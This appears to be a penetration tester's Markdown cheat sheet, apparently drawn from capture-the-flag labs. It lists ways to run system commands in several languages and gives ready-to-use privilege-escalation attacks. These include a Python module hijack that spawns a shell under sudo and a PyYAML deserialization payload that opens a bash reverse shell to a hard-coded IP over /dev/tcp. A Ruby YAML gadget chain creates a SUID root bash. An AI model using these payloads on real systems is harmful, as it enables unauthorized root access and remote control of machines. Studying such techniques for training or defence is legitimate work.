#### Python
```
import subprocess
output = subprocess.check_output('whoami', shell=True)
print(output.decode())
```
- execute system commands
- can also use:
```
import os
os.system('whoami')
```

hijacking imported module for priv esc
- user has sudo privs for python script that imports "random" module
- in same directory as script, run:
```
echo "import os" > random.py
```
- creates first line of new file. then:
```
echo 'os.system("/bin/bash")' >> random.py
```
- `cat random.py` should show:
```
import os
os.system("/bin/bash")
```
- then make modifiable:
```
chmod +x random.py
```
- set current directory as pythonpath:
```
export PYTHONPATH=/home/alice:$PYTHONPATH
```
- then run the command that has sudo privs:
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
- should create shell as rabbit user
#### Python2 v Python3
- absence of parentheses in print argument indicates script is written in python 2
	- Python 2: print is a statement, so parentheses are optional unless needed for grouping.
	- Python 3: print is a function, so parentheses are required:
		- Ex: `print("Website is up")`
- Using `input()` in Python2 can lead to security vulnerabilities because it evaluates user input as code.
	- Python 2:
		- `input()` function:
			 - Parses the user input as a Python expression using `eval()`
			- Equivalent to `eval(raw_input(prompt))`
			- Dangerous if user input is not trusted, as it can execute arbitrary code.
		- `raw_input()` function:
			- Reads user input as a string without evaluation.
	- Python 3:
		- `input()` function:
			- Reads user input as a string.
			- Equivalent to `raw_input()` in Python 2.
		- `raw_input()` function:
			- Removed in Python 3.
			- If you need to evaluate user input as code (which is generally discouraged), you must explicitly use `eval()`

PyYAML deserialization attacks
```
import yaml

data = """
!!python/object/new:os.system
- echo EXPLOIT!
"""
yaml_data = yaml.load(data)
```
- unsafe example: yaml.load is unsafe
```
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.13.0.22/443 0>&1\"')"
```
- rev shell payload (replace IP and port for `nc` listener)
#### PHP
```
<?php
echo shell_exec('whoami');
```
- can also execute code with `exec()` or `system()`

```
php -a
```
- bash to get an interactive php terminal
#### MySQL
```
SELECT sys_exec('whoami');
```
- only works if lib_mysqludf_sys is installed
	- otherwise, need to escape

#### Node.js (Javascript)
```
const { exec } = require('child_process');

exec('whoami', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
    }
    console.log(`Output: ${stdout}`);
});
```
- `child_process` to execute

#### Ruby
```
puts `whoami`
```
- backticks to execute or `system()`:
```
system('whoami')
```

Ruby YAML Deserialization privesc:
```
def list_from_file
    YAML.load(File.read("dependencies.yml"))
end
```
- unsafe YAML code, which was part of a script that user can run with sudo perms
```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```
- POC to save dependencies.yml file in example above 
	- saving in any writable directory should work; does not have to be in the same directory as the ruby script
- if upon running script with unsafe yaml again, should see `id` output (in addition to potential error messages), means POC worked. Replace with malicious payload:
```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf
         method_id: :resolve
```
- copies bash to `/tmp/0xdf` then modifies setid and setgid so anyone can run it and it runs as root
```
/tmp/0xdf -p
```
- root shell
#### Perl
```
system('whoami');
```

#### Java
```
import java.io.*;

public class Main {
    public static void main(String[] args) throws Exception {
        Process process = Runtime.getRuntime().exec("whoami");
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}
```
- `Runtime.getRuntime().exec()` to execute system commands